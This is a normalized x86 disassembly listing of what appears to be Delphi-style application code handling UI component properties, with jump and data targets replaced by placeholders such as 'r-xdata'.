mov edx esi
mov eax [ ebx + 0x5c ]
call sub_418790
xor eax eax
mov [ edi + 0x64 ] eax
xor eax eax
mov [ edi + 0x80 ] eax
mov [ edi + 0x84 ] eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
sub_45b068
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x39 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
jne r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
jne r-xdata
mov dl [ ebx + 0x38 ]
xor dl 0x1
mov eax ebx
call sub_45ac8c
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_45ad9c
test eax eax
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
je r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax ebx
call sub_45ad9c
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x88 ]
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
mov edx ebx
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_45b130
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45adb4
mov edx eax
mov ecx esi
mov eax ebx
call sub_45af40
pop esi
pop ebx
retn
sub_45b14c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_45b118
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_45aff4
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_4583f0
sub_45b174
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax esi
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
pop esi
pop ebx
retn
push ebx
mov ecx eax
mov edx esi
mov eax [ esi + 0x84 ]
call [ esi + 0x80 ]
xor eax eax
jmp r-xdata
cmp [ esi + 0x82 ] 0x0
je r-xdata
sub_45b1b8
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
push 0x0
mov ecx esi
mov edx ebx
call sub_45b1b8
jmp r-xdata
mov eax ebx
call sub_459218
cmp [ ebx + 0x6c ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
call sub_45ce90
sub_45b210
push ebx
mov ebx eax
cmp [ ebx + 0x4c ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ ebx + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebx + 0x4c ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_427864
mov [ ebx + 0x4c ] eax
sub_45b238
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov eax [ ebx + 0x44 ]
call sub_403368
xor eax eax
mov [ ebx + 0x44 ] eax
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x44 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45b4cc
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_403564
mov edx ebx
mov eax edi
call sub_421254
mov eax ebx
mov si 0xffee
call sub_403564
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x44 ] eax
pop edi
pop esi
pop ebx
retn
sub_45b2a8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x4c ] 0x0
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_427864
mov [ esi + 0x4c ] eax
sub_45b2dc
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_45adb4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_45adc4
mov edx [ eax ]
call [ edx + 0x40 ]
inc esi
dec ebx
jne r-xdata
sub_45b31c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_45b14c
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov eax [ esi + 0x34 ]
mov edx ebx
call sub_45b130
jmp r-xdata
mov edx ebx
mov eax esi
call sub_45b130
sub_45b380
push ebx
mov ebx eax
cmp dl [ ebx + 0x3d ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x3d ] dl
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x3d ] 0x0
je r-xdata
mov eax ebx
call sub_45ac44
sub_45b3ac
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov al [ edi + 0x95 ]
mov [ esi + 0xa8 ] al
cmp [ esi + 0xa8 ] 0x0
jne r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_45ac1c
cmp [ esi + 0x30 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x69 ]
mov eax esi
call sub_45ac8c
cmp [ esi + 0x38 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
call sub_45ace0
cmp [ esi + 0x39 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x74 ]
mov [ esi + 0x54 ] eax
cmp [ esi + 0x54 ] 0x0
jne r-xdata
test bl bl
je r-xdata
lea eax [ esi + 0x58 ]
mov edx [ edi + 0x7c ]
call sub_4041b8
cmp [ esi + 0x58 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov edx [ edi + 0x80 ]
mov eax esi
call sub_45ae0c
cmp [ esi + 0x40 ] 0xffffffff
jne r-xdata
mov dl [ edi + 0x6c ]
mov eax esi
call sub_45ad58
cmp [ esi + 0x3f ] 0x0
jne r-xdata
mov dx [ edi + 0x84 ]
mov eax esi
call sub_45ade8
cmp [ esi + 0x60 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_45adfc
cmp [ esi + 0x3e ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x88 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x8c ] eax
cmp [ esi + 0x8a ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_45b4cc
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_45ad9c
cmp edi eax
jne r-xdata
pop edi
pop esi
retn
xor ecx ecx
mov edx edi
mov eax esi
mov si 0xffef
call sub_403564
sub_45b4f0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45b510
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45b530
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45b550
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45b570
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45b590
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45b5b0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45b5d0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45b5f0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45b610
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_418f98
mov dl [ ebx + 0x39 ]
mov edi esi
mov eax edi
call sub_455918
mov edx [ ebx + 0x54 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x58 ]
mov eax edi
call sub_455a50
mov edx [ ebx + 0x40 ]
mov eax edi
call sub_455ab0
mov edx [ ebx + 0x30 ]
mov eax edi
call sub_4557b0
mov dl [ ebx + 0x3e ]
mov eax edi
call sub_455b70
push [ ebx + 0x8c ]
push [ ebx + 0x88 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45b688
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_4214a0
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_45ad9c
cmp edi eax
jne r-xdata
cmp edi [ esi + 0x7c ]
jne r-xdata
xor edx edx
mov eax esi
call sub_45b238
jmp r-xdata
cmp edi [ esi + 0x68 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_45b6dc
jmp r-xdata
xor edx edx
mov eax esi
call sub_4591a0
sub_45b6dc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x7c ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x7c ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x78 ]
call sub_456b74
mov eax ebx
call sub_45b74c
pop esi
pop ebx
retn
mov edx [ ebx + 0x78 ]
call sub_456bb8
mov edx ebx
mov eax [ ebx + 0x7c ]
call sub_421254
sub_45b724
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_45b724
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_458874
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_45b1b8
mov eax ebx
pop esi
pop ebx
retn
sub_45b760
push ebp
mov ebp esp
push ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_40c814
test eax eax
setne bl
test bl bl
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx 0xfffffffc
mov ecx 0x1
xchg edx eax
call sub_4046c4
sub_45b790
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_4041fc
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_45b814
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_45b936
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ esi ]
call sub_404424
test eax eax
jle r-xdata
test bl bl
je r-xdata
mov edi 0x1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ esi ]
call sub_404424
mov edx eax
sub edx 0x3
inc edx
mov eax [ esi ]
mov ecx 0x3
call sub_404684
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404570
jne r-xdata
inc edi
dec eax
jne r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b93d
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404188
retn
mov edx esi
mov ecx [ ebp - 0x8 ]
mov eax r-xdata
call sub_40470c
push [ esi ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_4044e4
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov eax [ esi ]
call sub_404424
mov ecx eax
sub ecx 0x3
mov eax [ esi ]
mov edx 0x1
call sub_404684
push [ ebp - 0x10 ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x6
call sub_4044e4
jmp r-xdata
mov edx [ esi ]
mov dl [ edx + edi - 0x1 ]
mov ecx [ rw-data ]
and edx 0xff
bt [ ecx ] edx
jae r-xdata
sub_45b974
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x19 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_45be13
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1a ] 0x0
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_4041fc
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45bdd4
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebp - 0x20 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_45adb4
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
lea eax [ ebp - 0x34 ]
mov edx [ ebp - 0x4 ]
call sub_4041fc
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45be1a
lea eax [ ebp - 0x48 ]
mov edx 0x4
call sub_404188
lea eax [ ebp - 0x34 ]
mov edx 0x3
call sub_404188
lea eax [ ebp - 0x18 ]
call sub_404164
lea eax [ ebp - 0x4 ]
call sub_404164
retn
mov eax ebx
call sub_45bfc8
test al al
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x38 ] eax
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_45adc4
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_404570
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg [ ebp - 0x1a ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_45b790
pop ecx
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx 0x1
jmp r-xdata
mov edx esi
mov eax ebx
call sub_45adc4
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_45adc4
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403368
mov eax [ ebp - 0x20 ]
call sub_403368
mov eax [ ebp - 0x14 ]
call sub_403368
mov eax [ ebp - 0xc ]
call sub_403368
retn
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
push ebp
call sub_45b790
pop ecx
mov eax [ ebp - 0x30 ]
call sub_404424
cmp ebx eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_45adc4
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x3c ]
call sub_45d86c
mov eax [ ebp - 0x3c ]
lea edx [ ebp - 0x2c ]
call sub_408068
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0x30
mov edx [ ebp - 0x30 ]
call sub_4041b8
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c814
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x30 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x2c ]
call sub_40c814
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_45adc4
push eax
mov edx esi
mov eax ebx
call sub_45adc4
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
jmp r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
dec [ ebp - 0x38 ]
jne r-xdata
inc edi
xor esi esi
lea eax [ ebp - 0x44 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x30 ]
call sub_404684
mov eax [ ebp - 0x44 ]
lea edx [ ebp - 0x2c ]
call sub_408068
push ebp
mov eax [ ebp - 0x2c ]
call sub_45b760
pop ecx
test al al
je r-xdata
inc ebx
jmp r-xdata
push ebp
mov eax [ ebp - 0x2c ]
call sub_45b760
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c814
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x34 ]
call sub_4041fc
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ecx eax
dec ecx
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x70 ]
inc esi
dec edi
jne r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_45adc4
add eax 0x30
push eax
mov edx esi
mov eax ebx
call sub_45adc4
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x40 ]
call sub_45d7d8
mov edx [ ebp - 0x40 ]
pop eax
call sub_4041b8
mov edx esi
mov eax ebx
call sub_45adc4
push eax
mov edx esi
mov eax ebx
call sub_45adc4
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x18 ]
call sub_404424
mov edx eax
mov ecx 0x1
mov eax [ ebp - 0x18 ]
call sub_404684
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x30 ]
xor ecx ecx
call sub_45b814
mov eax [ ebp - 0x18 ]
call sub_404424
mov edx eax
lea eax [ ebp - 0x18 ]
mov ecx 0x1
call sub_4046c4
lea edx [ ebp - 0x30 ]
mov ecx ebx
mov eax r-xdata
call sub_40470c
lea eax [ ebp - 0x30 ]
mov ecx ebx
mov edx [ ebp - 0x2c ]
call sub_45b814
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
sub_45be70
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov [ esp ] 0x0
test bl bl
jne r-xdata
xor eax eax
mov [ esp + 0x4 ] eax
xor ebp ebp
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_45adb4
mov edi eax
dec edi
sub edi ebx
jl r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_45adb4
mov edi eax
dec edi
sub edi ebx
jl r-xdata
inc edi
mov al [ esp ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_45bff4
test al al
je r-xdata
mov eax esi
call sub_45adb4
mov ebx eax
dec ebx
mov edi [ esp + 0x4 ]
sub edi ebx
jg r-xdata
inc edi
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_45adc4
call sub_45be4c
test al al
je r-xdata
dec edi
mov edx ebx
mov eax esi
call sub_45adc4
cmp [ eax + 0x3e ] 0x0
je r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_45adc4
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov edx ebx
mov eax esi
call sub_45adc4
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
jmp r-xdata
dec ebx
inc edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_45adc4
call sub_45be4c
test al al
je r-xdata
inc ebx
dec edi
jne r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_45adc4
mov ebp eax
jmp r-xdata
cmp [ ebp + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_45adc4
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_45adc4
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
mov edx ebx
mov eax esi
call sub_45adc4
call sub_45be4c
test al al
je r-xdata
xor ebp ebp
mov [ esp + 0x4 ] ebx
cmp [ ebp + 0x3e ] 0x0
jne r-xdata
mov [ ebp + 0x3e ] 0x0
mov [ esp ] 0x1
mov [ ebp + 0x3e ] 0x1
mov [ esp ] 0x1
sub_45bfc8
push ebx
mov ebx eax
mov al [ ebx + 0x3b ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_45bfc8
and eax 0x7f
mov al [ eax + rw-data ]
sub_45bff4
push ebx
mov ebx eax
mov al [ ebx + 0x3c ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_45bff4
and eax 0x7f
mov al [ eax + rw-data ]
sub_45c020
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_458d08
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0x84 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x38 ]
mov [ esi + 0x80 ] eax
mov [ esi + 0x70 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov esi eax
mov [ ebx + 0x44 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] r-xdata
mov [ ebx + 0x41 ] 0x1
mov ecx edi
xor edx edx
mov eax ebx
call sub_421184
mov eax [ ebx + 0x34 ]
mov [ eax + 0x3b ] 0x0
mov [ eax + 0x3c ] 0x0
mov eax ebx
call sub_45cd4c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_45c0bc
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov eax [ esi + 0x34 ]
call sub_403368
mov eax [ esi + 0x44 ]
call sub_403368
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4211d0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_45c130
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_45c130
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_458874
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_45b1b8
mov eax ebx
pop esi
pop ebx
retn
sub_45c170
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x1
jne r-xdata
